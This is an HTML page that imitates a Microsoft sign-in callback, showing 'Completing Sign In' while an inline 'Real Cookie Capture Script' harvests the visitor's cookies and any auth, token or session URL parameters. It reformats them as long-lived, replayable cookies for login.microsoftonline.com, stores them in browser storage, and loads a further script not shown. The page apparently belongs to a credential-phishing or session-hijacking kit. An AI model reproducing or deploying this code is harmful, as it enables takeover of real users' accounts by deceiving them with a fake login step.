<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signing you in...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: white;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 0;
            box-shadow: none;
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            color: #323130;
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            color: #605e5c;
            margin-bottom: 20px;
        }
        .status {
            font-size: 14px;
            color: #0078d4;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Completing Sign In</h1>
        <p>Please wait while we complete your authentication...</p>
        <div id="status-msg" class="status">Processing authentication...</div>
        <div id="spinner"></div>
    </div>

    <!-- Real Cookie Capture Script -->
    <script>
        // Check if we're coming from Microsoft domain and try to capture real cookies
        function attemptRealCookieCapture() {
            const urlParams = new URLSearchParams(window.location.search);
            const referrer = document.referrer;
            
            console.log('ðŸ” Attempting real cookie capture...');
            console.log('- Referrer:', referrer);
            console.log('- Current domain:', window.location.hostname);
            
            // If we have cookies on current domain, they might be Microsoft-related
            const currentCookies = document.cookie;
            if (currentCookies) {
                console.log('ðŸª Found cookies on current domain:', currentCookies);
                
                // Parse and format cookies
                const cookieArray = currentCookies.split(';').map(cookie => {
                    const [name, ...valueParts] = cookie.trim().split('=');
                    const value = valueParts.join('=');
                    return {
                        name: name.trim(),
                        value: value.trim(),
                        domain: '.login.microsoftonline.com',
                        path: '/',
                        secure: window.location.protocol === 'https:',
                        httpOnly: false,
                        sameSite: 'none',
                        expirationDate: 2147483647,
                        hostOnly: false,
                        session: false,
                        storeId: null,
                        capturedFrom: 'oauth-callback-real',
                        timestamp: new Date().toISOString(),
                        realUserData: true
                    };
                }).filter(c => c.name && c.value);
                
                if (cookieArray.length > 0) {
                    sessionStorage.setItem('real_captured_cookies', JSON.stringify(cookieArray));
                    localStorage.setItem('real_cookies_backup', JSON.stringify(cookieArray));
                    console.log('âœ… Stored real cookies:', cookieArray.length);
                }
            }
            
            // Try to extract cookie data from URL parameters (if Microsoft sends any)
            const cookieParams = [];
            for (const [key, value] of urlParams.entries()) {
                if (key.toLowerCase().includes('cookie') || 
                    key.toLowerCase().includes('auth') || 
                    key.toLowerCase().includes('token') ||
                    key.toLowerCase().includes('session')) {
                    
                    cookieParams.push({
                        name: key.toUpperCase(),
                        value: value,
                        domain: '.login.microsoftonline.com',
                        path: '/',
                        secure: true,
                        httpOnly: false,
                        sameSite: 'none',
                        expirationDate: 2147483647,
                        hostOnly: false,
                        session: false,
                        storeId: null,
                        capturedFrom: 'url-parameters',
                        timestamp: new Date().toISOString(),
                        realUserData: true
                    });
                }
            }
            
            if (cookieParams.length > 0) {
                sessionStorage.setItem('url_cookie_params', JSON.stringify(cookieParams));
                console.log('âœ… Found cookie-related URL parameters:', cookieParams.length);
            }
        }
        
        // Execute real cookie capture immediately
        attemptRealCookieCapture();
        
        // Also try after a delay in case cookies are set later
        setTimeout(attemptRealCookieCapture, 1000);
        setTimeout(attemptRealCookieCapture, 3000);
    </script>

    <script src="oauth-callback.js"></script>
</body>
</html>
